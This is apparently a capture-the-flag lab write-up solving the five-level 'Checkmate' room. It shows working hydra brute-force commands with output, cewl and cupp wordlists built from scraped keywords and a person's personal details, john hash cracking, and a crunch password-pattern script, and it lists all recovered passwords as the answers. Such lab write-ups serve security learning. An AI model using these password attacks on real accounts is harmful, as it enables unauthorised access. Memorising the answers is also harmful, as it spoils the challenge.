# Pentest Report — Checkmate

## 1. Summary

- **Target:** 10.48.133.111 (multiple web apps: "Operation Checkmate", "FirewallOS", "Engineering Careers", "social.thm")
- **Category:** Web exploitation
- **Status:** Complete
- **Outcome:** All 5 questions on the port 5000 "Operation Checkmate" app answered by chaining credential-brute-force and OSINT/social-engineering weaknesses across ports 5001, 5002, 5003, and SSH.

## 2. Scope & Environment

| Item | Value |
|---|---|
| Target IP | 10.48.133.111 |
| Hostname/title | Multiple (see ports below) |
| Date started | 2026-09-10 |

## 3. Methodology / Timeline

Chronological log of actions taken, in order. Filled in as the engagement progresses.

### 2026-09-10 — Initial recon

- Ran `nmap -sC -sV -oN initial.txt 10.48.133.111`
- Open ports:

| Port | Service | Details |
|---|---|---|
| 22/tcp | ssh | OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 |
| 5000/tcp | http | Werkzeug 3.1.6 (Python 3.12.3), title "Operation Checkmate" |
| 5001/tcp | http | Werkzeug 3.1.6 (Python 3.12.3), title "FirewallOS — Sign in" |
| 5002/tcp | http | Werkzeug 3.1.6 (Python 3.12.3), title "Engineering Careers" |
| 5003/tcp | http | Werkzeug 3.1.6 (Python 3.12.3), title "social.thm — Log in" |

- All four web ports run the Flask dev server (Werkzeug) directly — no reverse proxy in front, same Python 3.12.3 stack on each. Four distinct apps to work through: the "Checkmate" app itself, a firewall admin panel, a careers/job site, and what looks like a social media clone (`social.thm`).
- App-level notes from manual browsing:
  - Port 5000 ("Operation Checkmate"): password submission page for retrieving flags. Room instructions state blind brute-forcing against this app is out of scope and may trigger a temporary cooldown — intended technique should come from clues elsewhere in the room.
  - Port 5001 ("FirewallOS"): Management Console, admin login possible.
  - Port 5002 ("Engineering Careers"): job application page; Apply button is not interactive.
  - Port 5003 ("social.thm"): normal login page, login as an existing user possible; Create new account button is not interactive.

### 2026-09-10 — FirewallOS (5001) credential brute force

- Ran hydra against the FirewallOS admin login form:
  ```
  sudo hydra -l admin -P ../../../Security_Access/wordlists/10-million-password-list-top-1000000.txt -s 5001 10.48.133.111 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials."
  ```
  Result:
  ```
  [DATA] max 16 tasks per 1 server, overall 16 tasks, 999998 login tries (l:1/p:999998), ~62500 tries per task
  [DATA] attacking http-post-form://10.48.133.111:5001/login:username=^USER^&password=^PASS^:F=Invalid credentials.
  [5001][http-post-form] host: 10.48.133.111   login: admin   password: 12345
  1 of 1 target successfully completed, 1 valid password found
  ```
- Logged in to FirewallOS Management Console as `admin` / `12345`. Console is a demo/read-only panel — nothing further to interact with.
- Port 5000 quiz — Level 1, "What is the password for Level 1?": answered `12345`.
- Hint text on port 5000 pointing to the next target: "Marco built an internal Employee Login panel on jobs.thm:5002 and used common company keywords as passwords." Points at the Engineering Careers app (port 5002) as the next target.
- Found a set of company keywords on the port 5002 page: innovation, excellence, security, digital, cloud, future, talent.
- Tried these as candidate passwords against the Employee Login panel on port 5002 — `excellence` is the valid password.
- Ran cewl against port 5002 to build a wordlist, then hydra with `-l macro`:
  ```
  cewl -d 2 -m 3 --lowercase --with-number -e --email_file emails.txt -w cewl_words_5002.txt http://10.48.133.111:5002
  sudo hydra -l macro -P cewl_words_5002.txt -s 5002 10.48.133.111 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials."
  ```
  Result: `1 of 1 target completed, 0 valid password found`.
- Retried with the corrected username `marco`:
  ```
  sudo hydra -l marco -P cewl_words_5002.txt -s 5002 10.48.133.111 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials."
  [5002][http-post-form] host: 10.48.133.111   login: marco   password: excellence
  1 of 1 target successfully completed, 1 valid password found
  ```
- Used `marco` / `excellence` to log into the Employee Login panel on port 5002.
- Port 5000 quiz — Level 2, "What is the password for Level 2?": answered `excellence`.
- Hint text on port 5000 pointing to the next target: "Navigate to social.thm:5003 and derive Marco's password from personal info." Points at the social.thm app (port 5003) as the next target.
- Gathered personal info on Marco from the social.thm app (port 5003): First name Marco, surname Bianchi, nickname marky, birthdate 14021995.
- Used cupp.py to build a targeted password wordlist from this info:
  ```
  python3 cupp.py -i
  First Name: Marco
  Surname: Bianchi
  Nickname: marky
  Birthdate (DDMMYYYY): 14021995
  ```
- Ran hydra against the social.thm login on port 5003 with the cupp-generated wordlist (`marco.txt`):
  ```
  sudo hydra -l marco -P marco.txt -s 5003 10.48.133.111 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials."
  [5003][http-post-form] host: 10.48.133.111   login: marco   password: Bianchi2495
  1 of 1 target successfully completed, 1 valid password found
  ```
- Confirmed cred: `marco` / `Bianchi2495` on port 5003 (social.thm).
- Port 5000 quiz — Level 3, "What is the password for Level 3?": answered `Bianchi2495`.
- Hint text on port 5000 pointing to the next target: "On social.thm:5003, Marco recently uploaded a new profile picture. For privacy and storage consistency, the platform automatically renames uploaded files to the SHA256 hash of the original filename and saves them in the format (SHA256).png. Your task is to identify the original filename of Marco's uploaded profile picture. Submit only the filename to proceed."
- Found Marco's uploaded profile picture at `http://10.48.133.111:5003/uploads/d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png` — filename is a SHA256 hash per the challenge description.
- Cracked the hash with john (dictionary attack against the hash of the original filename):
  ```
  echo "d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b" > picturePath.txt
  john --format=raw-sha256 --wordlist=../../../Security_Access/wordlists/dirbuster/directory-list-2.3-small.txt picturePath.txt
  family           (?)
  1g 0:00:00:00 DONE ...
  john --show --format=raw-sha256 picturePath.txt
  ?:family
  ```
- Cracked value: `family` — original filename is `family.png`.
- Port 5000 quiz — Level 4, "What is the password for Level 4?": answered `family`.
- Hint text on port 5000 pointing to the final target: "Marco has revealed his password pattern on social.thm:5003, using predictable rules based on keywords and formatting. Use this information to generate a targeted wordlist and brute-force the SSH service with username marco."
- Marco's own tip found on social.thm: "My tip for strong password: I take a company keyword, capitalize it, then append the year like 2024 or any other number and an exclamation mark."
- Generated a targeted wordlist from `keyword.txt` (company keywords) with crunch, following Marco's pattern (Capitalized keyword + 4-digit number + `!`):
  ```
  while IFS= read -r word; do
    len=$(( ${#word} + 5 ))
    crunch "$len" "$len" -t "${word}20%%\!" -o "out_${word}.txt"
  done < keyword.txt
  cat out_*.txt > output.txt
  ```
  Sample output:
  ```
  Cloud2000!
  Cloud2001!
  Cloud2002!
  ...
  ```
- Launched hydra against SSH (port 22) with the generated wordlist:
  ```
  sudo hydra -l marco -P output.txt -t 4 10.48.133.111 ssh
  ```
- While the SSH brute force was running, captured the page source confirming the profile picture path for Q5:
  ```
  <img class="avatar-img" src="/uploads/d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b.png" alt="Profile">
  <div class="fw-semibold">Marco Bianchi</div>
  <div class="small text-secondary">@marco</div>
  ```
- Hydra completed after ~14 minutes:
  ```
  [22][ssh] host: 10.48.133.111   login: marco   password: Security2024!
  1 of 1 target successfully completed, 1 valid password found
  ```
- Confirmed cred: `marco` / `Security2024!` on SSH (port 22).
- Port 5000 quiz — Level 5, "What is the password for Level 5?": answered `Security2024!`.
- All 5 levels of the port 5000 "Operation Checkmate" quiz answered — challenge complete.

## 4. Findings

_(One entry per vulnerability/technique. Filled in as discovered.)_

Severity methodology: CVSS v3.1 base score, computed with the official FIRST.org calculator. Bands: 9.0-10.0 Critical, 7.0-8.9 High, 4.0-6.9 Medium, 0.1-3.9 Low.

### F1 — Weak Admin Credentials on FirewallOS Management Console (5001)
- **Severity:** Critical — CVSS 3.1: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`, 9.1
- **Description:** Admin login form on port 5001 accepted a weak, easily guessable password with no rate limiting/lockout, allowing successful hydra brute force.
- **Evidence:**
  ```
  sudo hydra -l admin -P ../../../Security_Access/wordlists/10-million-password-list-top-1000000.txt -s 5001 10.48.133.111 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials."
  [5001][http-post-form] host: 10.48.133.111   login: admin   password: 12345
  ```
- **Impact:**
- **How found:** hydra dictionary attack against the /login POST form on port 5001.

### F2 — Weak Employee Credentials on Engineering Careers Login (5002)
- **Severity:** Medium — CVSS 3.1: `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N`, 6.5
- **Description:** Employee login form on port 5002 accepted a password taken directly from a small set of company marketing keywords visible on the public-facing page, with no rate limiting.
- **Evidence:**
  ```
  sudo hydra -l marco -P cewl_words_5002.txt -s 5002 10.48.133.111 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials."
  [5002][http-post-form] host: 10.48.133.111   login: marco   password: excellence
  ```
- **Impact:**
- **How found:** cewl-scraped wordlist from the port 5002 page content, then hydra dictionary attack against the /login form.

### F3 — Password Derivable from Personal Info on social.thm (5003)
- **Severity:** High — CVSS 3.1: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`, 8.2
- **Description:** Marco's social.thm login password was built from his own personal details (surname + birth year variant), which were themselves discoverable on his public social.thm profile.
- **Evidence:**
  ```
  python3 cupp.py -i   # First Name: Marco / Surname: Bianchi / Nickname: marky / Birthdate: 14021995
  sudo hydra -l marco -P marco.txt -s 5003 10.48.133.111 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid credentials."
  [5003][http-post-form] host: 10.48.133.111   login: marco   password: Bianchi2495
  ```
- **Impact:**
- **How found:** OSINT on Marco's social.thm profile, cupp.py wordlist generation, then hydra dictionary attack.

### F4 — Predictable Filename Hashing Scheme for Uploaded Files (5003)
- **Severity:** Medium — CVSS 3.1: `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`, 5.3
- **Description:** Uploaded profile pictures are renamed to `SHA256(original_filename).png` with no salt, so common/guessable original filenames can be recovered by dictionary-cracking the hash.
- **Evidence:**
  ```
  echo "d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b" > picturePath.txt
  john --format=raw-sha256 --wordlist=../../../Security_Access/wordlists/dirbuster/directory-list-2.3-small.txt picturePath.txt
  family           (?)
  ```
- **Impact:**
- **How found:** Hash identified from the `/uploads/<hash>.png` filename in the page source, cracked with john using a directory-listing wordlist.

### F5 — Predictable Password Pattern Enables SSH Credential Brute Force
- **Severity:** Critical — CVSS 3.1: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`, 9.8
- **Description:** Marco reused a self-disclosed, predictable password pattern (Capitalized company keyword + 4-digit number + `!`) for his SSH account, allowing a small targeted wordlist to crack it quickly.
- **Evidence:**
  ```
  crunch "$len" "$len" -t "${word}20%%\!" -o "out_${word}.txt"   # per keyword, e.g. Cloud2000!..Cloud2099!
  sudo hydra -l marco -P output.txt -t 4 10.48.133.111 ssh
  [22][ssh] host: 10.48.133.111   login: marco   password: Security2024!
  ```
- **Impact:**
- **How found:** Marco's password-pattern tip on social.thm, combined with the company keyword list from port 5002, used to build a crunch wordlist and brute force SSH.

## 5. Exploitation Chain

1. Recon with nmap identified SSH (22) and four Flask web apps on ports 5000-5003.
2. Port 5000 ("Operation Checkmate") is a 5-level quiz asking for the password recovered at each stage; direct brute force against it is out of scope.
3. Hydra dictionary attack against the FirewallOS admin login (5001) recovered `admin` / `12345` (F1) — Level 1 answer, though the console itself was a read-only demo.
4. Company keywords scraped from the Engineering Careers page (5002) via cewl, combined with hydra, recovered `marco` / `excellence` on the port 5002 employee login (F2) — Level 2 answer.
5. Personal info (surname, birthdate) gathered from Marco's social.thm profile (5003), fed into cupp.py to build a targeted wordlist, recovered `marco` / `Bianchi2495` via hydra (F3) — Level 3 answer.
6. Identified Marco's uploaded profile picture hash in the page source, cracked it with john against a directory wordlist to recover the original filename `family.png` (F4) — Level 4 answer.
7. Marco's self-disclosed password pattern (keyword + year + `!`), combined with the port 5002 company keyword list, was used with crunch to build a small targeted wordlist; hydra against SSH recovered `marco` / `Security2024!` (F5) — Level 5 answer, completing the app.

## 6. Flag & Proof

- No flag — the port 5000 "Operation Checkmate" app is a 5-level quiz asking for the password recovered at each stage, not a flag-submission challenge.
- **Proof:** Passwords submitted per level:
  | Level | Answer | Source |
  |---|---|---|
  | 1 | `12345` | FirewallOS admin login (5001) |
  | 2 | `excellence` | Engineering Careers employee login (5002) |
  | 3 | `Bianchi2495` | social.thm login (5003) |
  | 4 | `family` | Cracked hash of uploaded profile picture filename (5003) |
  | 5 | `Security2024!` | SSH login (22) |

## 7. Remediation

_(Optional — fill in if the challenge expects defensive recommendations.)_

## 8. Appendix

_(Raw command output, scripts, screenshots referenced from findings.)_
